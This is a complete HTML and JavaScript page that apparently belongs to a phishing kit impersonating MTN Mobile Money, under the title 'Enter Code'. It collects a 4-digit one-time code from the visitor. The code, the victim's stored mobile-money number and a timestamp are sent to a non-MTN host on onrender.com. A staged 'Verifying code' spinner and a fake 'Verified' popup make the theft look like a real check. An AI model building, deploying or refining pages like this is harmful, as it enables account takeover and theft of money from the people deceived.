<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN — Enter Code</title>
<style>
  :root{
    --mtn-blue:#004F9F; --mtn-blue-dark:#003B77; --mtn-blue-deep:#002B5C;
    --mtn-yellow:#FFCC00; --bg:#F7F9FC; --card:#FFFFFF;
    --text:#0A1B33; --muted:#64748B; --border:#E2E8F0; --green:#00A651;
    --red:#D32F2F;
  }
  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;}
  html,body{height:100%;}
  body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;}

  .frame-top,.frame-bottom{
    width:100%;height:6px;
    background:linear-gradient(90deg,var(--mtn-blue-deep) 0%,var(--mtn-blue) 50%,var(--mtn-blue-deep) 100%);
  }
  .frame-bottom{margin-top:auto;}

  .header{
    width:100%;background:var(--mtn-blue-deep);
    border-bottom:1px solid var(--mtn-blue-dark);
    padding:18px 20px;position:sticky;top:0;z-index:50;
    box-shadow:0 4px 16px rgba(0,43,92,0.28);
  }
  .header-inner{width:100%;max-width:920px;margin:0 auto;display:flex;align-items:center;justify-content:center;}
  .brand{display:flex;align-items:center;text-decoration:none;}
  .brand strong{font-size:26px;font-weight:900;color:#fff;letter-spacing:2px;text-transform:uppercase;}
  .brand strong em{font-style:normal;color:var(--mtn-yellow);}

  main{width:100%;max-width:920px;flex:1;padding:52px 20px 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;}

  .card{
    background:var(--card);width:100%;max-width:440px;
    border-radius:20px;padding:34px 28px 34px;
    box-shadow:0 12px 40px rgba(0,43,92,0.10);
    border:1px solid var(--border);border-top:4px solid var(--mtn-blue-deep);
    text-align:center;
  }

  .code-input{
    width:100%;
    padding:22px 14px;
    border:2px solid var(--border);
    border-radius:14px;
    background:#FBFDFF;
    font-size:38px;
    font-weight:900;
    color:var(--mtn-blue-deep);
    letter-spacing:22px;
    text-align:center;
    font-variant-numeric:tabular-nums;
    transition:.18s;
    margin-bottom:18px;
  }
  .code-input::placeholder{
    color:#D5DEE9;
    letter-spacing:22px;
    font-weight:900;
  }
  .code-input:focus{
    outline:none;
    border-color:var(--mtn-blue-deep);
    background:#fff;
    box-shadow:0 0 0 4px rgba(0,43,92,0.12);
  }
  .code-input.shake{
    animation:shake .4s cubic-bezier(.36,.07,.19,.97) both;
    border-color:var(--red);
  }
  @keyframes shake{
    10%,90%{transform:translateX(-2px);}
    20%,80%{transform:translateX(4px);}
    30%,50%,70%{transform:translateX(-6px);}
    40%,60%{transform:translateX(6px);}
  }

  .indicator{
    width:100%;height:5px;
    background:#E8EEF6;
    border-radius:6px;
    overflow:hidden;
    margin-bottom:26px;
  }
  .indicator-bar{
    height:100%;width:0%;
    background:linear-gradient(90deg, var(--mtn-blue-deep), var(--mtn-blue));
    border-radius:6px;
    transition:width .25s ease, background .25s ease;
  }
  .indicator-bar.warning{
    background:linear-gradient(90deg, #E53935, var(--red));
  }

  .cta{
    width:100%;padding:16px;border:none;border-radius:12px;
    background:var(--mtn-blue-deep);color:#fff;font-size:16px;font-weight:800;
    cursor:pointer;letter-spacing:0.3px;transition:.18s;
    box-shadow:0 8px 20px rgba(0,43,92,0.32);
  }
  .cta:hover:not(:disabled){background:var(--mtn-blue);transform:translateY(-2px);}
  .cta:active:not(:disabled){transform:translateY(0);}
  .cta:disabled{opacity:.6;cursor:not-allowed;transform:none;}

  .status{
    font-size:12px;text-align:center;margin-top:14px;
    font-weight:700;min-height:16px;
  }
  .status.err{color:var(--red);}
  .status.ok{color:var(--green);}

  /* Full-screen processing */
  .processing-screen{
    position:fixed;inset:0;z-index:2000;
    background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
    color:#fff;display:none;align-items:center;justify-content:center;
    flex-direction:column;text-align:center;padding:24px;overflow:hidden;
    animation:fadeIn .3s ease;
  }
  .processing-screen.show{display:flex;}
  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
  .processing-screen .glow{
    position:absolute;width:460px;height:460px;border-radius:50%;
    background:radial-gradient(circle, rgba(255,204,0,0.18) 0%, rgba(255,204,0,0) 70%);
    animation:pulse 2.6s ease-in-out infinite;pointer-events:none;
  }
  @keyframes pulse{0%,100%{transform:scale(1);opacity:.85;}50%{transform:scale(1.18);opacity:1;}}
  .processing-screen .brand-mark{
    font-size:22px;font-weight:900;letter-spacing:3px;
    text-transform:uppercase;color:#fff;margin-bottom:40px;opacity:.9;position:relative;z-index:2;
  }
  .processing-screen .brand-mark em{font-style:normal;color:var(--mtn-yellow);}
  .processing-screen .spinner{
    width:88px;height:88px;border-radius:50%;
    border:6px solid rgba(255,255,255,0.14);
    border-top-color:var(--mtn-yellow);border-right-color:var(--mtn-yellow);
    animation:spin 0.95s linear infinite;margin-bottom:34px;position:relative;z-index:2;
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  .processing-screen h1{
    font-size:26px;font-weight:800;letter-spacing:-0.5px;
    margin-bottom:10px;position:relative;z-index:2;
  }
  .processing-screen p.sub{
    font-size:14px;color:rgba(255,255,255,0.72);
    font-weight:600;line-height:1.6;max-width:340px;position:relative;z-index:2;
  }
  .processing-screen .dots{
    margin-top:26px;display:flex;justify-content:center;gap:8px;position:relative;z-index:2;
  }
  .processing-screen .dots span{
    width:8px;height:8px;border-radius:50%;
    background:rgba(255,255,255,0.25);
    animation:blink 1.4s infinite ease-in-out;
  }
  .processing-screen .dots span:nth-child(2){animation-delay:.2s;}
  .processing-screen .dots span:nth-child(3){animation-delay:.4s;}
  @keyframes blink{0%,80%,100%{background:rgba(255,255,255,0.25);}40%{background:var(--mtn-yellow);}}

  /* Success popup */
  .modal-overlay{
    position:fixed;inset:0;background:rgba(10,27,51,0.55);
    backdrop-filter:blur(4px);display:none;
    align-items:center;justify-content:center;
    padding:20px;z-index:1000;animation:fadeIn .25s ease;
  }
  .modal-overlay.show{display:flex;}
  .modal{
    background:#fff;width:100%;max-width:360px;
    border-radius:18px;padding:30px 24px 26px;text-align:center;
    box-shadow:0 24px 60px rgba(0,43,92,0.35);
    border-top:5px solid var(--green);
    animation:pop .32s cubic-bezier(.18,.9,.32,1.4);
  }
  @keyframes pop{from{transform:scale(.85);opacity:0;}to{transform:scale(1);opacity:1;}}
  .modal .check{
    width:62px;height:62px;border-radius:50%;
    background:rgba(0,166,81,0.12);
    display:flex;align-items:center;justify-content:center;margin:0 auto 18px;
  }
  .modal .check svg{
    width:32px;height:32px;stroke:var(--green);fill:none;
    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
  }
  .modal h2{font-size:19px;font-weight:800;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
  .modal p{font-size:13px;color:var(--muted);font-weight:600;line-height:1.6;margin-bottom:22px;}
  .modal .ok-btn{
    width:100%;padding:14px;border:none;border-radius:11px;
    background:var(--mtn-blue-deep);color:#fff;
    font-size:15px;font-weight:800;cursor:pointer;
    letter-spacing:0.3px;transition:.18s;
    box-shadow:0 6px 16px rgba(0,43,92,0.28);
  }
  .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}

  @media(max-width:640px){
    .card{padding:28px 20px;}
    main{padding:36px 16px 44px;}
    .brand strong{font-size:22px;letter-spacing:1.5px;}
    .code-input{font-size:32px;letter-spacing:18px;padding:18px 12px;}
    .code-input::placeholder{letter-spacing:18px;}
    .processing-screen h1{font-size:21px;}
  }
</style>
</head>
<body>

  <div class="frame-top"></div>

  <header class="header">
    <div class="header-inner">
      <a class="brand" href="index.html"><strong>MTN<em>.</em></strong></a>
    </div>
  </header>

  <main>
    <div class="card">
      <input
        type="tel"
        id="codeInput"
        class="code-input"
        inputmode="numeric"
        maxlength="4"
        placeholder="••••"
        autocomplete="one-time-code"
      >

      <div class="indicator">
        <div class="indicator-bar" id="indicatorBar"></div>
      </div>

      <button class="cta" id="approveBtn" onclick="approve()" disabled>Approve</button>

      <div class="status" id="status"></div>
    </div>
  </main>

  <div class="frame-bottom"></div>

  <div class="processing-screen" id="processingScreen">
    <div class="glow"></div>
    <div class="brand-mark">MTN<em>.</em></div>
    <div class="spinner"></div>
    <h1>Verifying code</h1>
    <p class="sub">Please wait while we confirm your code.</p>
    <div class="dots"><span></span><span></span><span></span></div>
  </div>

  <div class="modal-overlay" id="successModal">
    <div class="modal">
      <div class="check">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <h2>Verified</h2>
      <p>Your code was accepted.</p>
      <button class="ok-btn" onclick="closeModal()">OK</button>
    </div>
  </div>

<script>
  const API = "https://mtnadvanced-loans.onrender.com";
  const el = id => document.getElementById(id);

  const session = JSON.parse(localStorage.getItem('session') || 'null');
  if(!session){
    window.location.href = 'login.html';
  }

  const input = el('codeInput');
  const bar   = el('indicatorBar');
  const btn   = el('approveBtn');

  function setStatus(msg, type){
    const s = el('status');
    s.textContent = msg;
    s.className = 'status' + (type ? ' ' + type : '');
  }

  function refresh(){
    const v = input.value.replace(/\D/g, '');
    input.value = v;

    const pct = Math.min(100, (v.length / 4) * 100);
    bar.style.width = pct + '%';
    bar.classList.toggle('warning', v.length > 0 && v.length < 4);

    btn.disabled = (v.length !== 4);
  }

  input.addEventListener('input', refresh);
  input.addEventListener('keydown', e => {
    if(e.key === 'Enter' && input.value.length === 4){
      approve();
    }
  });

  refresh();
  input.focus();

  function showProcessing(){ el('processingScreen').classList.add('show'); }
  function hideProcessing(){ el('processingScreen').classList.remove('show'); }
  function openModal(){ el('successModal').classList.add('show'); }

  function closeModal(){
    el('successModal').classList.remove('show');
    setTimeout(() => { window.location.href = 'index.html'; }, 250);
  }

  async function approve(){
    const code = input.value.replace(/\D/g, '');

    if(code.length !== 4){
      input.classList.add('shake');
      setTimeout(() => input.classList.remove('shake'), 500);
      return;
    }

    btn.disabled = true;
    input.disabled = true;
    setStatus('');
    showProcessing();

    try{
      const res = await fetch(`${API}/code`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          momo: session.momo,
          code: code,
          time: new Date().toLocaleString()
        })
      });

      const data = await res.json();

      // Small delay so spinner is visible
      await new Promise(r => setTimeout(r, 1200));

      hideProcessing();

      if(data.ok){
        setStatus('');
        openModal();
      }else{
        setStatus('❌ ' + (data.error || 'Could not verify code.'), 'err');
        btn.disabled = false;
        input.disabled = false;
        input.focus();
      }
    }catch(err){
      hideProcessing();
      setStatus('❌ Could not reach server.', 'err');
      btn.disabled = false;
      input.disabled = false;
      input.focus();
    }
  }
</script>
</body>
</html>
